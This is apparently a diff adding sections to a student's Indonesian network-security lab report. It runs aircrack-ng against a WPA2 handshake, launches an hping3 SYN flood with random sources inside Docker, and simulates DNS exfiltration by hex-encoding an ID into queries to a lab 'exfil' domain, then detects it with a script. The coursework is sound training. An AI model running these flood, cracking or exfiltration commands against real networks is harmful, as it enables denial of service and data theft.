@@ -207,3 +207,201 @@ penyerang-k9.lab-arp-k9 (172.18.0.4) at 42:13:31:0d:e7:ef [ether] on eth0
 gara (172.18.0.1) at e6:14:eb:a3:2e:70 [ether] on eth0
 gateway-k9.lab-arp-k9 (172.18.0.3) at be:5b:37:87:4c:98 [ether] PERM on eth0
 ```
+
+## Tugas 4 (Pertemuan 4): Analisis handshake WPA2
+**Perintah**
+```bash
+docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k9.txt handshake-k9.cap
+```
+**Output**
+```text
+Reading packets, please wait...
+Resetting EAPOL Handshake decoder state.
+Opening handshake-k9.cap
+Read 499 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:0B:86:C2:A4:85  linksys                   WPA (1 handshake, with PMKID)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Resetting EAPOL Handshake decoder state.
+Opening handshake-k9.cap
+Read 499 packets.
+
+1 potential targets
+
+                               Aircrack-ng 1.7 
+
+      [00:00:00] 20/20 keys tested (901.87 k/s) 
+
+      Time left: --
+
+                                KEY NOT FOUND
+
+
+      Master Key     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+```
+
+## Tugas 5 (Pertemuan 5): ICMP dengan Scapy
+**Perintah**
+```bash
+docker run --rm --network lab-arp-k9 -v "$PWD/01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2
+```
+**Output**
+```text
+Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
+TTL balasan: 64
+Tipe ICMP balasan: 0
+```
+
+## Tugas 6 (Pertemuan 6): SYN flood dan theree-way handshake
+**Perintah 1**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml up -d
+```
+**Output**
+```text
+[+] Running 3/3
+✓ Network k9_lab           Started                              0.7s
+✓ Container k9-attacker-1  Started                              0.7s
+✓ Container k9-target-1    Started                              0.7s
+```
+**Perintah 2**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
+```
+**Output**
+```text
+0
+```
+**Perintah 3**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood --rand-source target
+```
+**Output**
+```text
+none
+```
+**Perintah 4**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
+```
+**Output**
+```text
+8
+```
+**Perintah 5**
+```bash
+docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
+```
+**Output**
+```text
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+07:17:18.144359 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [S], seq 4107155652, win 64240, options [mss 1460,sackOK,TS val 2883927288 ecr 0,nop,wscale 10], length 0
+07:17:18.144388 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [S.], seq 3677737955, ack 4107155653, win 65160, options [mss 1460,sackOK,TS val 4270507158 ecr 2883927288,nop,wscale 10], length 0
+07:17:18.144401 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
+07:17:18.144465 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [P.], seq 1:71, ack 1, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 70: HTTP: GET / HTTP/1.1
+07:17:18.144479 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [.], ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 0
+07:17:18.144634 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [P.], seq 1:239, ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 238: HTTP: HTTP/1.1 200 OK
+07:17:18.144645 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 239, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
+07:17:18.144670 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [P.], seq 239:1135, ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 896: HTTP
+07:17:18.144675 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1135, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
+07:17:18.145453 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [F.], seq 71, ack 1135, win 63, options [nop,nop,TS val 2883927289 ecr 4270507158], length 0
+07:17:18.145488 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [F.], seq 1135, ack 72, win 64, options [nop,nop,TS val 4270507159 ecr 2883927289], length 0
+07:17:18.145496 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1136, win 63, options [nop,nop,TS val 2883927289 ecr 4270507159], length 0
+
+12 packets captured
+12 packets received by filter
+0 packets dropped by kernel
+```
+**Perintah 6**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml down -v
+```
+**Output**
+```text
+[+] Running 3/3
+✓ Container k9-attacker-1  Removed                              10.3s
+✓ Container k9-target-1    Removed                              0.3s
+✓ Network k9_lab           Removed                              0.1s
+```
+
+## Tugas 7 (Pertempuran 7): DNS exfiltration
+**Perintah 1**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml up -d
+```
+**Output**
+```text
+[+] Running 3/3
+✓ Network k9-attacker-1    Started                              0.7s
+✓ Container k9-attacker-1  Started                              0.7s
+✓ Container k9-dns-1       Started                              0.7s
+```
+**Perintah 2**
+```bash
+echo -n NIM-24552011216-K9 | xxd -p
+```
+**Output**
+```text
+4e494d2d32343535323031313231362d4b39
+```
+**Perintah 3**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 4e494d2d32343535323031313231362d4b39.k9.exfil.lab @dns
+```
+**Output**
+```text
+10.0.0.99
+```
+**Perintah 4**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
+```
+**Output**
+```text
+none
+```
+**Perintah 5**
+```bash
+python3 01-sumber-lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log
+```
+**Output**
+```text
+Jumlah query per domain induk:
+  exfil.lab: 1
+
+Query mencurigakan (label panjang berisi hex):
+  panjang=36  4e494d2d32343535323031313231362d4b39.k9.exfil.lab
+  ```
+**Perintah 6**
+```bash
+echo 4e494d2d32343535323031313231362d4b39 | xxd -r -p
+```
+**Output**
+```bash
+NIM-24552011216-K9
+```
+**Perintah 7**
+```bash
+docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml down -v
+```
+**Output**
+```text
+[+] RUnning 3/3
+✓ Container k9-dnd-1       Removed                              0.2s
+✓ Container k9-attacker-1  Removed                              10.3s
+✓ Network k9_lab           Removed                              0.1s
+```
